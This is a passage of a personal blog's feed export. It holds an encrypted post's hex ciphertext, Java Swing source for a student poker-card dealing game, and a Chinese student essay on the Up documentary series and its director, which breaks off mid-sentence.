4942256c22c1bd934c8679570ceffd309783a3109d7accfe31bacbf4712f8345b5135fdb534b5f6d7762f84ece65439aa557efa4246f106ce8a5654241d5fb246d11860e81e64551bc0e79a21450f0bc8ac16b2c9e3a2900acd8d4c45111c2a55918fc675aa2600400f21cdfd99e40a36a90bd9307a0a0a0020d58b2afadd28a044ee8bf489cf088ea5da225786abc43e775a7ee98b135691473e01af482457fb5bd55a3fd0568aaee8576aa0a40c267c7e08c0e788e1ab3bd5b23156b6e2bd6e49d7aafc524dd1a317264a8c8a79e0d6355ba36a3ce83f2f22ac2f88fe7914ca64f960167cfedcc5457dd90f32fe14c3d212dab5545461209200944d980f790e9b4da67d5174b77c957ccadf54ffb514dc0bfb768f34b22dad55706b3850928311224dbb78c029d755623724a9a25fc371b38a5fd43489c8652436040a1b6384771b11961292587e92acb34c11cdee5d5e81f8d126adc5613f14743a712816941c2b2676152af03bf45d6b0381211b3396e0146610d1fd6d8dc847a010898c336e34d55c3d8f39dd084968978c4448cf14982aab09dcf5b128bf1523e2363b0ab4cec94bf149faeb42443d316f1436488e85689b51070fcc5fbb7d167d76297c449d23714fe2347a31d03b16494672822d769a4c829260052a7119c61ea949beeca2c24103f9cf2986819e69e3278fae0026a24487f5033c8a35ffd0e841f20b3d7e3cd75011ff204cb9d21a7eb86391fd1c69fea2e27c04a7af8e7a2d393ace4761b1e2804034cf78e6cc7cc0c3119508e888c6d23bbb665ba3363533975fd8470ef83d590b37d54e6778a15da03abd4953738281f8f75e98f6bf3aaac330a93068b6d1ad1e5d3fcbf4d99bd548ac9c60bb58032e0f70258c34e602f8f5578b9d257c4cb6dd648588fc2b87b444f67af854a95101311b2ad9686d241c5a59870689c4c951678bd35283f3156f0132112d8625be29316d24153031cf2518991bcaa9a88e7ca63ec6988d69773da52a336dd7a1d535db8410bc9807add3a32b90a600bb76d98d3591c592d2152f051092d22cdad803977c26f4428f50c1718e5cac2ef757207cd8b8d1478a3be53a69275204b403955ec9c2a822d8dc338b9d69d83227eb58f7c3ce95ea7b03a0f681fd453032b42b304ea162e65556b9d53d45193a8b9d50f0a39dd9839f754186a9448b09f9036980ce4b08e40bf98c65b2a12e08ee8ff9d1270f318c83039a45426c55ffef738e7bf026430ac67e73a4e38d190b07d106479d9bd129bea5dfee5f932e5428db3634589b5fc7bfe1661b45b17dceca517c6c0fe27dd08be071eb4b4095af4e7e04eec0890dd7ba3ff7b2273b5244e3a272017774faab6746ae16b7439e4f2a769012b785515d1eb1c4b30a2725bd0fe19567ebd329469e5e090428fcbd5e3d5acdc61fefd923e3e86efef2bea12e4aa0619c9f755823954d9954006b07775d92df4ad3a1130f03da4c0a4edc50547b75554ebb37cb97684d444b03953f856738c226be60203eb4028161138d742b3f9b80bd7174a52e8c6d2585370452336c8c4729f42415ed6ef240fa3b28be5a3562d040452669bce9ecb8c2eb4f9054efb2c1661242fe60fd8ec154908ff77c64d05c19237f4a6553301b5ebef63bc0daa0076941a5c31ce78d47235e0a06b92edb9c6a69d589f1620a4e08c8a00561adbfa70616f549b14e496cb6ace899e7615e97baa2268926d3ea0efb85079fe8d4ffcd9e911489485b183aea2d534f05110e9e4f2643695e3fc77390e2a8817d9e1fdcfc1ace22f6091582f9b2d19bac8cd3cfcb5a06caf1ec82a49aa4f53af10882d67acbe7b98636022746f2305b53bec06f918888e36535c178d1d5c09d5657a7570125125045d18c3925bb97ecf84b3f7fa36393ef75ff7870c9609f96292af03e664291e1444140c5167a2b9808be26a63e6b9ef9b50c457035e6c036d6b85267e5bb1f38c33101970b9617a963aa0d44e17f49d0f944568c4ec702542c3bcd9f3056876a0faf249158e63a94864218c67eba285492e204e273d6bd24dfd4211c4c47bacd9e3de572fc23806d8a2dd6e508f939d600d5be316de280c57df5296faece0336bc9f5a1ece78c5d5b1aa5ec6a26b3c328be8b12c54bfff27501a547630a73e5b9f77060d88fc636b0316500ddf162434aadee6ed17ca54931840e0d99db95af86d760d3948669b11759be6f736011585205edc917fea896ebbe353a8353bf1354cba9a135617f0db6e652c8b7459c5797d66e6ad3c89436c231087158bb558566b1a318ea6b685df65a634170575df1315f3c0287eef6c37995c49947f794ce96086687418d2b4c0191c36165984fcbc04b4e5c31189f8afe9e6bd80d814906193eef350304ca145e8f53eb41915a2b29b40b2bfa26f719b7de9362bc5cfff1934f05564f1cb186e1f1371fb281d0c23a927f3efa315531bc2e9b04224c5aa5bd61dd8f7b0fc847b7285b2ae12d177731ee8d785328f4da303d679a43fbafd0eccd45ca8f60f04577a0f209c6896932558a6d28b3730abf09b54570b45305c2bb2b381bf6395bfac61564590134a318adceb7d34a89191fd452204c89b57b1a53e4ffa7c1d8a2502e9ec6a194729fe073258c0c25511bbb203cb011ef3bf45eb3f4b4ab8f52f5c7dbea2bd243ab12a53b9fcb769517b655b6760025d60e02f0a98b3128c158f5cc5fe2f44cf85fc9ed87428d6fa8c15ee952f16a6702fe3334641271d0d0d5216bb54b7491e870edc3b0d6145e8c1651cb9c72698be7dc5b1875b867ac4412173c1431893bed4057761f58e32c9f0e0e9b018b955e2d7f04327752294981177541ff83ccb751c12e31745c59bcee72a41759749a2603f5b13cc4cce340f527cd6a4fd622982f794a12d38654932e4d1313a4deebeccc121275b009b6b8832d222cf2d23d1b7100695cbeafbec17b6ec098900c5005f294575ec27df4dbaa72890fe3519f2aaececd7f35a320d0e321643ce270dc06d0b43c371218eeb72c55838650e31c3859896618731c5e2f543f723eb53c7ad93ac8cf30a1cb85eb802fb7e73651e40238615c44bf430a98b6095f1d937342dbdc3e77bfc0c754d3b883f547e4c5ee14d90df0f56bf247c491a21727f3e6622b6a2e8b80b618af2cd302ba20f29d6e059ffd90ac28b18b42418fb71782efed82acc4e2d07c060599a98f5629ec8f38a9cee9c3f8f35cf435880a1a0af5cfcbd1d23468a6c2bdc4f3e9c14ad062df205a7d5780eba0b829e06d49a4ea539719611335a8e20558aea6fd35eca8d63dcb700a01e1f74e1b6731aaa257586d9907b3cf69fff0f0d069d2b0b22a8c958db91f21962d55bfe7c64eb3206c33315c550c060eea247c0eb394f3409e0fb2c624ee5c1ff187332477a6f295528e533ac4f914c0265588d0c5d5b516cf367d35fd35f2c684211b6ec2f94f79eb9f6f774d3fbcde35e8d2aa0e9145b74642293e50d23b6e89d1877b41f9dc15c28f82c7cf311aa1511fe6db668007eaf87fa4990f41b86d47d1ff1f63c039b176dd53ba1fadd112a1173126234f23d122144aae083dcd903f67f6c0c3a3fc9ca0b5e376ddf0ad4ad85e357cadfd2c52c583b0a5a0ae5743a5937dee25b3cbb2142c01ebfe77423ef96718114ded9debe9d3b12dcd128ff834402804c55b6957d98f0747f8636f2d66fd1073a996c1e8a6cf524031e45feb29d1ccabce0b9a3307205c72da78d5d5d94e027a53d7198e7984a9628d7e4f4b42d2561c4374fef33698960a8d1e7c6276c7556d9574d6a67c208e4517bdc384e7527779331957fe1a4288ea47e46f896c1cb45c9ae3b657f8e9249131bae5a8c082832e0baa03e0bddb779ad23df9d443e2056a20aacd270c96a45dbc4f54b89ab20a91d28d150c9d97d35af2e9e22b4e15577633c6e25997bc891ee7106599f7c672d8a753f0364507aa693681e49f5eb2edda87fc10f331c5fa3b21ec71889e128ea413336f631d82dd52fcf1591f2c65cc1803391e435720762300f493f12064514e20eeb8090562e7e65a0fd4c547b75da1b075a33f15dc856cb8375d9f9903697ac07211980575c492ecf5ea94c21689a5a9c6c294552fdd716e55514d4bd70da15758ed55025450643a9c12809e56167ea6eb8590e1bf222782587c64f3960f6e98bfac84e16893de58a7a29c943e2796685bfb5005ff1f17ed1d6077eb2fcc33acbf63608ae7c2dce1f91c7b1f161cba9285cf3dcbc3d7286f6ebabd26b4b77cda029721a93d8cb3e723b6a098c76e7d173a5c27685807e295b5eab8b523cf5955a53c7b9eb5eec05b3b8bbfeb9c05a9d049d3df3acaec3b9ecd339567e3252d2834a5cfc3019e8e0ec445bdaf64545623584df3d149d48f343aa600f4e24c5648a570207ecf87367249956db73a76bee6aa491334b36635a0e134370c59dfc928ba9562bacd668f177488784030ca65e9857d7b43f172b8d6422f72e4f86f891914ee681739c78e0c508e13f2154e8cf1c046eb623f6ea1c5f7f288aaaa706ce1549fedda12102fe55f80394abd290265c208dd1bd18792dab95f0b5e873ef193a8c3f6320f29957671837453547085e8d58285e47864117232fa49f154d06c36bed580a89d8f482fd05a1e1bac3785aa072bba3535764bcbde46d82a84c057b2940a39a821469eb1c59096f5eaac8e30512ad7c564495ec99671a08ff63f117cde9cbe88b0b78e206a9a47099785852daf347e50e96df82b380649e945b96c3b420f32d890e44544da9c1449fba758eac3037877f10ee148cf58cd493a0a646561fab9358b70eab211a6f90e0fe9098fb39e56cfe2459594ea606ae46975ab0330b48bae143eaed11e345e6c78d6cf39b6797b299d16fa0c9c1302209c5dc9596cb4198fc0b93c4031b4407029be1a339a01075ecf652bd5317d7ad6d4f264b32b294710db2fb5da035c3acaa15290203fa6f1eef2c05b8cf57623c96a6fe1a8b9ad1d042a4c3eacc2e9251e804a6d485359a83</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>JAVA 扑克牌6-2</title>
    <url>/2020/12/22/JAVA-%E6%89%91%E5%85%8B%E7%89%8C6/</url>
    <content><![CDATA[<p>JAVA 扑克牌6-2</p>
<a id="more"></a>

<blockquote>
<ul>
<li><a href="https://lhl1.lanzous.com/iP3SMjlfp2h">sy6源码 </a></li>
<li><a href="https://lhl1.lanzous.com/iJYOGjmngrc">sy6-3源码 </a><br><img src="/photo/sy6-2.png" alt="sy6源码"><br><img src="/photo/puke-6.mp4" alt="sy6源码"><br><video src="/photo/puke-6.mp4" controls="controls" width="500" height="300">您的浏览器不支持播放该视频！</video></li>
</ul>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">package pukepai;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class test implements ActionListener
&#123;
    JFrame jf;
    JButton b1;
    JButton b2;


    public test()
    &#123;
        dapai da &#x3D; new dapai();
        &#x2F;&#x2F;抽取程序
        Font font &#x3D; new Font(&quot;黑体&quot;, Font.BOLD, 36);
        JFrame jf &#x3D; new JFrame(&quot;LHL&#39;s Java&quot;);
        jf.setLayout(new FlowLayout(FlowLayout.CENTER));
        JButton b1 &#x3D; new JButton(&quot;Play 1&quot;);
        b1.addActionListener(new ActionListener()
                             &#123;
                                 @Override
                                 public void actionPerformed(ActionEvent e)
                                 &#123;
                                     JFrame jf2 &#x3D; new JFrame(&quot;Play1&quot;);

                                     jf2.setLayout(new GridLayout(1, 1));
                                     &#x2F;&#x2F;外窗口
                                     JInternalFrame jif &#x3D; new JInternalFrame();
                                     jif &#x3D; new createChuangkou1(1);
                                     jif.setVisible(true);
                                     jf2.add(jif);
                                     jf2.setExtendedState(JFrame.MAXIMIZED_BOTH);
                                     jf2.setVisible(true);
                                     jf2.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                                 &#125;


                             &#125;
        );
        b1.setFont(font);
        jf.add(b1, Component.CENTER_ALIGNMENT);
        JButton b2 &#x3D; new JButton(&quot;Play 4&quot;);
        b2.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                JFrame jf2 &#x3D; new JFrame(&quot;Play2&quot;);

                jf2.setLayout(new GridLayout(2, 2));
                &#x2F;&#x2F;外窗口
                JInternalFrame jif[] &#x3D; new JInternalFrame[4];
                for (int i &#x3D; 0; i &lt;&#x3D; 3; i++)
                &#123;
                    jif[i] &#x3D; new createChuangkou(i + 1);
                    jif[i].setVisible(true);
                    jf2.add(jif[i]);
                &#125;

                jf2.setExtendedState(JFrame.MAXIMIZED_BOTH);
                jf2.setVisible(true);
                jf2.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

            &#125;
        &#125;);
        b2.setFont(font);
        jf.add(b2);

        jf.setBounds(500, 500, 400, 135);
        jf.setVisible(true);
        jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    &#125;

    public static void main(String[] args)
    &#123;
        new test();
    &#125;

    @Override
    public void actionPerformed(ActionEvent e)
    &#123;


    &#125;
&#125;

class createChuangkou extends JInternalFrame
&#123;
    JLayeredPane jp;
    int n &#x3D; 0;
    dapai da &#x3D; new dapai();
    Toolkit tk &#x3D; Toolkit.getDefaultToolkit();
    &#x2F;&#x2F;工具包
    int w &#x3D; (tk.getScreenSize().width) &#x2F; 2;
    int h &#x3D; (tk.getScreenSize().height) &#x2F; 2;

    public createChuangkou(int n)
    &#123;
        super(&quot;Player&quot; + n);
        this.n &#x3D; n;
        this.setLayout(null);
        jp &#x3D; this.getLayeredPane();
        Setbg();
        Setbutton(n);
        JButton chupaiButton &#x3D; new JButton(&quot;To play a card&quot;);
        chupaiButton.setBounds(850, h - 201 - 150 + 200, 200, 50);
        chupaiButton.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;

            &#125;
        &#125;);
        jp.add(chupaiButton, new Integer(-110));
    &#125;

    void Setbg()
    &#123;
        ImageIcon bj &#x3D; new ImageIcon(&quot;img&#x2F;bj.jpg&quot;);
        JLabel jl &#x3D; new JLabel(bj);
        jl.setSize(w, h);
        jp.add(jl, new Integer(-100));
    &#125;

    void Setbutton(int k)
    &#123;

        String[] WpukePhoto &#x3D; new String[13];
        WpukePhoto &#x3D; da.zuhe();
        JButton[] ButtonPhoto &#x3D; new JButton[13];
        ImageIcon PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;fang1.jpg&quot;);
        int pw &#x3D; PukePhoto.getIconWidth();
        int ph &#x3D; PukePhoto.getIconHeight();
        int x1 &#x3D; 70; &#x2F;&#x2F; 表示2个扑克牌按钮叠加在一起的宽度
        int y1 &#x3D; 150; &#x2F;&#x2F; 表示扑克牌按钮底边距离neibuchuangti底边的位置
        int kuan &#x3D; pw - x1;
        int firstPositionx &#x3D; (w - kuan * 13) &#x2F; 2 - 35;
        int firstPositiony &#x3D; (h - ph - y1);
        for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
        &#123;
            PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;&quot; + WpukePhoto[i]);
            ButtonPhoto[i] &#x3D; new JButton(PukePhoto);
            ButtonPhoto[i].setBounds(firstPositionx + kuan * i, firstPositiony, pw, ph);
            jp.add(ButtonPhoto[i], new Integer(i));
        &#125;
    &#125;

&#125;

class createChuangkou1 extends JInternalFrame
&#123;
    JLayeredPane jp;
    int n &#x3D; 0;
    dapai da &#x3D; new dapai();
    Toolkit tk &#x3D; Toolkit.getDefaultToolkit();
    &#x2F;&#x2F;工具包
    int w &#x3D; (tk.getScreenSize().width);
    int h &#x3D; (tk.getScreenSize().height);
    JButton chupaiButton;
    JButton[] ButtonPhoto;
    int chupaishu &#x3D; 0;
    int tiaoguoshu &#x3D; 0;
    int chupaixuhao[] &#x3D; new int[13];
    int tiaoguopaiBool &#x3D; 0;
    int yitiaoguoshu &#x3D; 0;

    public createChuangkou1(int n)
    &#123;
        super(&quot;Player&quot; + n);
        this.n &#x3D; n;
        this.setLayout(null);
        jp &#x3D; this.getLayeredPane();
        Setbg();
        for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
        &#123;
            chupaixuhao[i] &#x3D; -1;
        &#125;
        Setbutton(n);
        chupaiButton &#x3D; new JButton(&quot;To play a card&quot;);
        chupaiButton.setBounds(850, h - 201 - 150 + 200, 200, 50);
        chupaiButton.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
                &#123;
                    if (ButtonPhoto[i].getLocation().y !&#x3D; 729)
                    &#123;
                        ButtonPhoto[i].setLocation(w &#x2F; 2 - 60, 400);

                        chupaixuhao[chupaishu] &#x3D; i;
                        chupaishu++;
                    &#125;

                &#125;
            &#125;

        &#125;);
        jp.add(chupaiButton, new Integer(-110));
        repaint();
    &#125;

    void Setbg()
    &#123;
        ImageIcon bj &#x3D; new ImageIcon(&quot;img&#x2F;bj.jpg&quot;);
        JLabel jl &#x3D; new JLabel(bj);
        jl.setSize(w, h);
        jp.add(jl, new Integer(-100));
    &#125;

    void Setbutton(int k)
    &#123;

        String[] WpukePhoto &#x3D; new String[13];
        WpukePhoto &#x3D; da.zuhe();
        ButtonPhoto &#x3D; new JButton[13];
        ImageIcon PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;fang1.jpg&quot;);
        int pw &#x3D; PukePhoto.getIconWidth();
        int ph &#x3D; PukePhoto.getIconHeight();
        int x1 &#x3D; 70; &#x2F;&#x2F; 表示2个扑克牌按钮叠加在一起的宽度
        int y1 &#x3D; 150; &#x2F;&#x2F; 表示扑克牌按钮底边距离neibuchuangti底边的位置
        int kuan &#x3D; pw - x1;
        int firstPositionx &#x3D; (w - kuan * 13) &#x2F; 2 - 35;
        int firstPositiony &#x3D; (h - ph - y1);

        for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
        &#123;

            if (tiaoguopaiBool !&#x3D; 1)
            &#123;
                PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;&quot; + WpukePhoto[i]);
                ButtonPhoto[i] &#x3D; new JButton(PukePhoto);
                ButtonPhoto[i].setBounds(firstPositionx + kuan * i, firstPositiony, pw, ph);
                ButtonPhoto[i].addActionListener(new ActionListener()
                &#123;
                    @Override
                    public void actionPerformed(ActionEvent e)
                    &#123;
                        JButton bn;
                        bn &#x3D; (JButton) e.getSource();
                        int flag &#x3D; 1;
                        jp.add(chupaiButton, new Integer(10));

                        for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
                        &#123;
                            for (int j &#x3D; 0; j &lt;&#x3D; 12; j++)
                            &#123;
                                if (i &#x3D;&#x3D; chupaixuhao[j])
                                &#123;
                                    tiaoguopaiBool &#x3D; 1;
                                    yitiaoguoshu++;
                                &#125;
                            &#125;
                            if (bn &#x3D;&#x3D; ButtonPhoto[i])
                            &#123;
                                for (int j &#x3D; 0; j &lt;&#x3D; 12; j++)
                                &#123;
                                    if (j &#x3D;&#x3D; i)
                                        continue;
                                    if (ButtonPhoto[j].getLocation().y !&#x3D; (h - ph - y1))
                                        ButtonPhoto[j].setBounds(firstPositionx + kuan * j, firstPositiony, pw, ph);
                                &#125;
                                if (ButtonPhoto[i].getLocation().y &#x3D;&#x3D; (h - ph - y1))
                                &#123;
                                    System.out.println(h - ph - y1);
                                    ButtonPhoto[i].setBounds(firstPositionx + kuan * i, firstPositiony - 30, pw, ph);
                                &#125;


                            &#125;
                        &#125;
                        repaint();
                    &#125;
                &#125;);
                jp.add(ButtonPhoto[i], new Integer(i));

            &#125;

        &#125;
    &#125;


&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">package pukepai;

public class dapai
&#123;
    public String[] puke1&#x3D;new String[53];
    public String[] puke2&#x3D;new String[puke1.length];
    public String[] puke3&#x3D;new String[13];
    &#x2F;&#x2F;没排好序的牌
    public String[] puke4&#x3D;new String[53];
    &#x2F;&#x2F;计算重复的牌
    public String[] puke5&#x3D;new String[53];
    &#x2F;&#x2F;排好序的牌
    int k&#x3D;0;
    &#x2F;&#x2F;取出牌的数量

    public dapai()
    &#123;
        int count&#x3D;0;
        String[] puke&#x3D; &#123;&quot;fang&quot;,&quot;hong&quot;,&quot;mei&quot;,&quot;hei&quot;&#125;;
        int i,j,k;
        for(i&#x3D;0;i&lt;4;i++)
        &#123;
            String name&#x3D;puke[i];
            for(j&#x3D;0;j&lt;13;j++)
            &#123;
                puke1[count]&#x3D;
                        name&#x3D;puke[i]+(int)(j+1)+&quot;.jpg&quot;;
                count++;
            &#125;
        &#125;
        daluan();

    &#125;

    public void  daluan()
    &#123;
        System.arraycopy(puke1, 0, puke2, 0, puke1.length);
        int i,j,m;
        for(m&#x3D;0;m&lt;puke1.length;m++) &#123;
            i&#x3D;(int)(Math.random()*100)%52;
            j&#x3D;(int)(Math.random()*100)%52;
            String t;
            t&#x3D;puke2[i];
            puke2[i]&#x3D;puke2[j];
            puke2[j]&#x3D;t;
        &#125;
    &#125;
    public void chouqu()
    &#123;
        int i;
        for(i&#x3D;0;i&lt;13;i++)
        &#123;
            puke3[i]&#x3D;puke2[i];
            System.out.println(puke3[i]);
        &#125;

    &#125;
    public  String[] zuhe()
    &#123;
        int i;
        int j;
        int f&#x3D;1;
        int k3&#x3D;0;&#x2F;&#x2F;puke3
        int k4&#x3D;0;&#x2F;&#x2F;puke4
        for(i&#x3D;0;i&lt;13;i++)
        &#123;
            for(j&#x3D;0;j&lt;52;j++)
            &#123;
                if(puke2[i]&#x3D;&#x3D;puke4[j])
                &#123;
                    f &#x3D; 0;
                    break;
                &#125;
            &#125;
            if(f&#x3D;&#x3D;1)
            &#123;
                puke3[k3++]&#x3D;puke2[i];
                puke4[k4++]&#x3D;puke2[i];
            &#125;
            f&#x3D;1;
        &#125;
        int k&#x3D;0;
        &#x2F;&#x2F;puke5的计数
        for(i&#x3D;0;i&lt;52;i++)
        &#123;
            for(j&#x3D;0;j&lt;13;j++)
            &#123;
                if(puke1[i]&#x3D;&#x3D;puke3[j])
                &#123;
                    puke5[k++]&#x3D;puke3[j];
                &#125;
            &#125;
        &#125;
        return puke5;
    &#125;

    public static void main(String[]args)
    &#123;
        dapai da&#x3D;new dapai();
        String s1[]&#x3D;new String[13];


        s1&#x3D;da.zuhe();

        for(int i&#x3D;0;i&lt;13;i++)
            System.out.println(s1[i]);
        System.out.println(&quot;---------------------------&quot;);

    &#125;
&#125;;



<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>纪录片-人生七年论文</title>
    <url>/2020/12/21/%E7%BA%AA%E5%BD%95%E7%89%87-%E4%BA%BA%E7%94%9F%E4%B8%83%E5%B9%B4%E8%AE%BA%E6%96%87/</url>
    <content><![CDATA[<p>人生七年论文</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">人生七年论文
导演：
《人生七年》创作团队的灵魂是该片导演艾普特。 1941年，艾普特出生于英国的一个中产家庭，父母是保 险公司的普通员工。后来，艾普特进入伦敦城市学院， 并因成绩优异取得奖学金。高中毕业以后，他进入剑桥 大学攻读历史和法律学位。1964年，艾普特进入格拉那 达电视公司任调查员；1968年艾普特荣升为导演并以执 导电视剧和广告崭露头角；1977年，他开始执导剧情片， 并屡次获奖；1980年他执导的《矿工的女儿》一举获奥 斯卡最佳影片等七项提名；1988年再以《迷雾森林十八 年》入围奥斯卡提名，最后夺得最佳女主角奖；1999年 他执导的007电影《007之黑日危机》蜚声世界；2013年， 因其对电影业的贡献，艾普特获得了“美国导演工会奖” （Directors Guildof America Award）。 虽然导演过这么多重量级作品，但艾普特最为自 得的还是《人生七年》。他在一次采访中说到：“尽管后 来我获得过不少奥斯卡提名，但我最骄傲的作品一直是 《人生七年》。要知道，从来没有一部纪录片有这个耐 心、跨度和时间，只为记录普通人平凡生活中的跌宕起 伏。这是目前世界上以纪录片形式作过的最长的社会学 研究，仅凭这一点，它就值得被记住。”




纪录片介绍：
《成长系列》（又名人生七年，英语：Up Series）是一部由ITV出品的纪录片，于1964年开始记录14位英国的七岁儿童的生活，到目前为止，该纪录片已经跨越56年（每7年一集），并在ITV和BBC播出。2005年英国第四台将该系列纳入最伟大的50部纪录片名单中。[1]被选中的孩子们代表了当时英国不同社会经济背景的阶层，并做出了明确的假设，即每个孩子的社会阶级预先决定了他们的未来。每隔7年导演迈克尔·艾普特从14位参与拍摄的参与者生活中取材。该系列的目的是按当初7 Up中的“我们把这些孩子们聚到一起，因为我们想在2000年时看看英格兰的一个缩影，2000年时的工人和主管，现在都只有七岁。”
纪录片目的与资金来源：
纪录片运营的首要环节就是获得资金。英国的电视 通常采取“制播分离”方式，纪录片的投资多数是从无 线和有线电视获得的。为了得到资金，纪录片制作人需 要给“购片编辑”提供拍摄预案，然后获得资金、开始拍 摄。目前，在每年两个审片季里，电视栏目组都会收到世 界各国独立制片人递交的拍摄提案。电视栏目会根据相 关要求对这些申请逐轮进行筛选和淘汰，最后安排入围 的导演或制片人当面答辩，并最终确定合作关系及投资 数额。另外，欧美的纪录片产业里还有一个关键的角色， 即“纪录片中间人”。这些中介机构致力寻找各种有潜力 的提案，然后推荐给电视台，劝其购买。具体到《人生七 年》，该纪录片系列就是由格拉纳达电视公司和英国的 BBC和ITC电视台联合投资开发的。 拍摄完成以后，纪录片面临的另一个重要问题就是 发行。在拍摄初期，《人生七年》只是一部实验型的纪录 片，格拉那达公司并没有想从中获得商业利益，所以也没 有从事任何宣传推广活动。实际上，在首部完成后的15 年间，这部纪录片没有带来任何经济上的收益。到了20 世纪80年代后期，随着观众的不断增加，该纪录片的商 业价值才逐渐体现出来。特别是艾普特自掏腰包在美国 为《人生七年》进行宣传，制作推介广告，并开发出这部 纪录片的衍生产品，才让这个系列为全世界所熟知。




纪录片背景：
 “阶级消亡说”下的创作背景
众所周知，英国是一个阶级观念明确的国家。早
期的英国社会由三个阶层组成，即贵族绅士阶层、市
民阶层、劳动阶层。二战后，英国的经济得到更加蓬
勃的发展，社会阶层也发生显著变化。传统的贵族阶
级逐渐与工商新贵融为一体，长期的经济增长也使得
原本处于中下层的英国人获得更多的发展机会，他们
可以通过自身奋斗或其他因素来提升自身所处的社会
位置。“英国的阶级正在消亡”的理论引起了一场广
泛的社会辩论。为了突出阶级对人生的影响，导演在角色的选择
上也是下了一番功夫。从上流社会到孤儿院，从豪华
都市到乡村田野，他们中有来自利物浦中产阶级的尼
尔、有来自伦敦东区贫民窟的托尼、农二代、富家千
金、高富帅三人组、工人阶级姐妹花等。这些形形色
色的孩子们遍及整个国家，将他们汇聚在一起，仿佛
就能看到英国的未来。
纵观全剧，可以发现有好几个来自中产家庭的孩
子都不止一次地发出“我不能够，也不想成为这个阶
层的代表”等类似言论，他们似乎很抵触自己的家庭
或者出身所带来的阶级特征。他们认为，正是人们这
种阶级观念造成了他们付出再多努力也会被忽视的局
面。而到最后一部《56 Up》时，才有人说出看似光
鲜靓丽的家庭其实早在他 9 岁那年就已经支离破碎，
他只能靠自己的努力完成一切。


最大震撼：
不过，事情远没有这么简单。《人
生七年》系列给人的最大震撼在于，你
永远无法想象一个人在任意一个七年当
中会面临怎样的挑战，以至于每到一个
拍摄节点时，这些受访者真实的生活状
态有可能和观众的期待完全背道而驰。
换句话说，阶层和家庭似乎只能够决定
